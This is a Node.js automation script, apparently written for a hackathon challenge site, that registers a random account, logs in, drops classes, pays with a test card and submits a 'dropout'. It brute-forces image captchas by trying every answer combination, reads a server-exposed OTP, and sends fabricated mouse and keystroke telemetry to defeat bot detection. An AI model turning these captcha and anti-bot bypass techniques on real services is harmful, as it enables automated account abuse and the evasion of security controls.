/**
 * PURE API DROPOUT SCRIPT - v5
 * ALL operations via API
 * Browser login runs SIMULTANEOUSLY just for visual feedback
 */

require('dotenv').config();
const sharp = require('sharp');

const BASE_URL = "https://hackathon-backend-326152168.us-east4.run.app";
const LOGIN_URL = "https://deckathon-concordia.com/login";

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ============================================================================
// BRUTE FORCE CAPTCHA (API)
// ============================================================================

async function bruteForceCaptcha(challengeType, purpose, authToken = null) {
    console.log(`\n🔐 Brute forcing ${challengeType} captcha (purpose: ${purpose})...`);

    const headers = { "Content-Type": "application/json" };
    if (authToken) headers["Authorization"] = "Bearer " + authToken;

    const challengeRes = await fetch(`${BASE_URL}/captcha/challenge?challenge_type=${challengeType}`, { headers });
    const challengeData = await challengeRes.json();

    if (!challengeRes.ok) {
        console.log("   Challenge failed:", challengeData);
        return null;
    }

    const encryptedAnswer = challengeData.encrypted_answer;
    const allUrls = challengeData.images.map(img => img.url);
    console.log(`   Got ${allUrls.length} images, brute forcing...`);

    for (let i = 0; i < 512; i += 50) {
        const batchPromises = [];

        for (let j = 0; j < 50 && (i + j) < 512; j++) {
            const val = i + j;
            const selectedUrls = [];
            for (let bit = 0; bit < 9; bit++) {
                if ((val >> bit) & 1) selectedUrls.push(allUrls[bit]);
            }

            const p = fetch(`${BASE_URL}/captcha/submit`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    selected_urls: selectedUrls,
                    encrypted_answer: encryptedAnswer,
                    purpose: purpose
                })
            }).then(async res => {
                if (res.ok) return (await res.json()).captcha_solved_token;
                return false;
            }).catch(() => false);

            batchPromises.push(p);
        }

        const results = await Promise.all(batchPromises);
        const token = results.find(r => r && r !== false);
        if (token) {
            console.log(`   ✅ Solved!`);
            return token;
        }
        await sleep(10);
    }

    console.log("   ❌ Failed after 512 attempts");
    return null;
}

// ============================================================================
// REGISTRATION (API)
// ============================================================================

async function registerAccount() {
    console.log("\n📝 REGISTERING (API)...");

    const username = Array.from({ length: 8 }, () => 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)]).join('') + Math.floor(Math.random() * 999);
    const email = username + "@outlook.com";
    const password = "Aa1!" + Array.from({ length: 8 }, () => 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 62)]).join('');

    console.log(`   ${username} / ${password}`);

    const prepRes = await fetch(`${BASE_URL}/form/prepare/public/register`);
    const prepData = await prepRes.json();
    const formPrepToken = prepData.form_prep_token || '';
    console.log("   Got prep token, waiting 10s...");
    await sleep(10000);

    const registerRes = await fetch(`${BASE_URL}/user`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            username, email, password, full_name: "Test User",
            form_prep_token: formPrepToken,
            mouse_movement_count: 200,
            mouse_total_distance: 4000,
            recaptcha_token: ''
        })
    });

    if (!registerRes.ok) {
        console.log("   Failed:", await registerRes.json());
        return null;
    }

    console.log("   ✅ Registered!");
    return { username, password, email };
}

// ============================================================================
// LOGIN (API)
// ============================================================================

async function loginAPI(username, password) {
    console.log("\n🔑 LOGGING IN (API)...");

    // Get form prep token
    const prepRes = await fetch(`${BASE_URL}/form/prepare/public/login`);
    const prepData = await prepRes.json();
    const formPrepToken = prepData.form_prep_token || '';
    console.log("   Got prep token, waiting 3s...");
    await sleep(3000);

    // Brute force captcha
    const captchaToken = await bruteForceCaptcha("logos", "auth", null);
    if (!captchaToken) return null;

    // Login
    const loginRes = await fetch(`${BASE_URL}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            username, password,
            captcha_solved_token: captchaToken,
            form_prep_token: formPrepToken,
            mouse_movement_count: 200,
            mouse_total_distance: 4000
        })
    });

    const loginData = await loginRes.json();
    const mfaToken = loginData.mfa_required_auth_token;
    if (!mfaToken) {
        console.log("   ❌ No MFA token:", loginData);
        return null;
    }

    // MFA
    const mfaInitRes = await fetch(`${BASE_URL}/mfa/initiate`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${mfaToken}` }
    });
    const mfaInitData = await mfaInitRes.json();
    const otpCode = mfaInitData.otp_code;
    console.log(`   OTP: ${otpCode}`);

    const mfaSubmitRes = await fetch(`${BASE_URL}/mfa/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${mfaToken}` },
        body: JSON.stringify({
            encrypted_mfa_code_token: mfaInitData.encrypted_mfa_code_token,
            code: otpCode
        })
    });

    const mfaSubmitData = await mfaSubmitRes.json();
    const authToken = mfaSubmitData.auth_token;
    if (!authToken) {
        console.log("   ❌ No auth token");
        return null;
    }

    console.log("   ✅ Logged in!");
    return authToken;
}

// ============================================================================
// DROP CLASSES (API)
// ============================================================================

async function dropClasses(authToken) {
    console.log("\n📚 DROPPING CLASSES (API)...");

    const res = await fetch(`${BASE_URL}/user-info`, {
        headers: { 'Authorization': `Bearer ${authToken}` }
    });
    const data = await res.json();
    const classes = data.classes || [];

    console.log(`   Found ${classes.length} classes`);

    for (const cls of classes) {
        const dropRes = await fetch(`${BASE_URL}/class`, {
            method: 'DELETE',
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` },
            body: JSON.stringify({ class_id: cls.class_id })
        });
        console.log(`   Dropped ${cls.class_id}: ${dropRes.status}`);
    }

    const newRes = await fetch(`${BASE_URL}/user-info`, {
        headers: { 'Authorization': `Bearer ${authToken}` }
    });
    const newData = await newRes.json();
    console.log(`   New balance: $${newData.finance?.balance || 0}`);

    return true;
}

// ============================================================================
// PAYMENT (API) - needs form_prep_token
// ============================================================================

async function makePayment(authToken) {
    console.log("\n💳 PAYMENT (API)...");

    // Check balance
    const userRes = await fetch(`${BASE_URL}/user-info`, {
        headers: { 'Authorization': `Bearer ${authToken}` }
    });
    const userData = await userRes.json();
    const balance = userData.finance?.balance || 0;

    if (balance <= 0) {
        console.log("   ✅ No payment needed!");
        return true;
    }

    console.log(`   Balance: $${balance}`);

    // Step 1: Get AUTHENTICATED form prep token (not public!)
    console.log("   Getting auth'd prep token...");
    const prepRes = await fetch(`${BASE_URL}/form/prepare/payment`, {
        headers: { 'Authorization': `Bearer ${authToken}` }
    });
    const prepData = await prepRes.json();
    const formPrepToken = prepData.form_prep_token || '';
    console.log(`   Got prep token: ${prepRes.status}`);

    // Step 2: Get checkout session token
    console.log("   Getting checkout session...");
    const checkoutRes = await fetch(`${BASE_URL}/payment/checkout-session`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` },
        body: JSON.stringify({ amount: balance, currency: "CAD" })
    });
    const checkoutData = await checkoutRes.json();
    console.log(`   Checkout session: ${checkoutRes.status}`);

    // Wait 5s to avoid rate limit
    console.log("   Waiting 5s...");
    await sleep(5000);

    // Step 3: Add payment method (use /form/prepare/payment - not payment-method!)
    console.log("   Adding payment method...");
    const addCardRes = await fetch(`${BASE_URL}/payment-method`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` },
        body: JSON.stringify({
            credit_card_number: "4242424242424242",
            cvv: "424",
            expiry: "12/26",
            form_prep_token: formPrepToken,  // From /form/prepare/payment
            mouse_movement_count: 200,
            mouse_total_distance: 4000
        })
    });
    const addCardData = await addCardRes.json();
    console.log(`   Add card: ${addCardRes.status}`, JSON.stringify(addCardData).substring(0, 200));

    // Step 4: Brute force sun captcha for payment
    const paymentCaptchaToken = await bruteForceCaptcha("sun", "payment", authToken);
    if (!paymentCaptchaToken) {
        console.log("   ❌ Failed to solve payment captcha");
        return false;
    }

    // Step 5: Make payment with all required fields
    console.log(`   Paying $${balance}...`);
    const payRes = await fetch(`${BASE_URL}/payment`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` },
        body: JSON.stringify({
            checkout_session_token: checkoutData.checkout_session_token,
            captcha_solved_token: paymentCaptchaToken,
            payment_method_last_4: "4242",
            amount: balance,
            form_prep_token: formPrepToken,
            mouse_movement_count: 200,
            mouse_total_distance: 4000
        })
    });

    const payData = await payRes.json();
    console.log(`   Payment: ${payRes.status}`, JSON.stringify(payData).substring(0, 100));

    // Check new balance
    const newUserRes = await fetch(`${BASE_URL}/user-info`, {
        headers: { 'Authorization': `Bearer ${authToken}` }
    });
    const newUserData = await newUserRes.json();
    console.log(`   New balance: $${newUserData.finance?.balance || 0}`);

    return (newUserData.finance?.balance || 0) <= 0;
}

// ============================================================================
// DROPOUT (API)
// ============================================================================

async function dropout(authToken) {
    console.log("\n🚪 DROPOUT (API)...");

    // Check balance
    const userRes = await fetch(`${BASE_URL}/user-info`, {
        headers: { 'Authorization': `Bearer ${authToken}` }
    });
    const userData = await userRes.json();
    const balance = userData.finance?.balance || 0;

    if (balance > 0) {
        console.log(`   ❌ Cannot dropout - balance: $${balance}`);
        return false;
    }

    // Brute force captcha
    const captchaToken = await bruteForceCaptcha("pretty_faces", "dropout", authToken);
    if (!captchaToken) return false;

    // Dropout
    const dropoutRes = await fetch(`${BASE_URL}/dropout`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` },
        body: JSON.stringify({
            captcha_solved_token: captchaToken,
            keystroke_count: 310,
            unique_chars_count: 45,
            checkbox_entropy: 150.5,
            confirm_button_entropy: 150.0,
            captcha_entropy: 750.0,
            time_on_page: 2500.0
        })
    });

    const data = await dropoutRes.json();
    if (dropoutRes.ok) {
        console.log("   🎉 DROPOUT SUCCESSFUL!");
        return true;
    }

    console.log("   ❌ Failed:", data);
    return false;
}

// ============================================================================
// BROWSER LOGIN (visual only, runs in parallel)
// ============================================================================

async function visualBrowserLogin(username, password, authToken) {
    console.log("\n🌐 VISUAL: Opening browser...");

    const { connect } = require('puppeteer-real-browser');

    const connection = await connect({
        headless: false,
        fingerprint: false,
        turnstile: true,
        args: ['--window-size=1920,1080'],
        customConfig: { chromePath: process.env.CHROME_PATH },
        connectOption: { defaultViewport: { width: 1920, height: 1080 } }
    });

    const page = connection.page;

    // Go to backend to set cookie
    await page.goto('https://hackathon-backend-326152168.us-east4.run.app/', { waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => { });
    await page.setCookie({
        name: 'auth_token',
        value: authToken,
        domain: 'hackathon-backend-326152168.us-east4.run.app',
        path: '/',
        secure: true
    });

    // Go to frontend
    await page.goto('https://deckathon-concordia.com/', { waitUntil: 'domcontentloaded' });
    await page.evaluate((token) => {
        localStorage.setItem('auth_token', token);
        localStorage.setItem('token', token);
    }, authToken);
    await page.reload({ waitUntil: 'domcontentloaded' });

    console.log("   🌐 Browser ready");
    return { page, browser: connection.browser };
}

// ============================================================================
// MAIN
// ============================================================================

async function main() {
    console.log("=".repeat(60));
    console.log("🚀 PURE API DROPOUT v6 (no browser)");
    console.log("=".repeat(60));

    try {
        // 1. Register via API
        const account = await registerAccount();
        if (!account) return;

        // 2. Login via API
        const authToken = await loginAPI(account.username, account.password);
        if (!authToken) return;

        // 3. Drop classes via API
        await dropClasses(authToken);

        // 4. Payment via API
        await makePayment(authToken);

        // 5. Dropout via API
        const success = await dropout(authToken);

        console.log("\n" + "=".repeat(60));
        console.log(success ? "✅ SUCCESS!" : "❌ FAILED");
        console.log(`   Username: ${account.username}`);
        console.log(`   Password: ${account.password}`);
        console.log("=".repeat(60));

    } catch (err) {
        console.error("\n❌ Error:", err.message);
    }
}

main().catch(console.error);
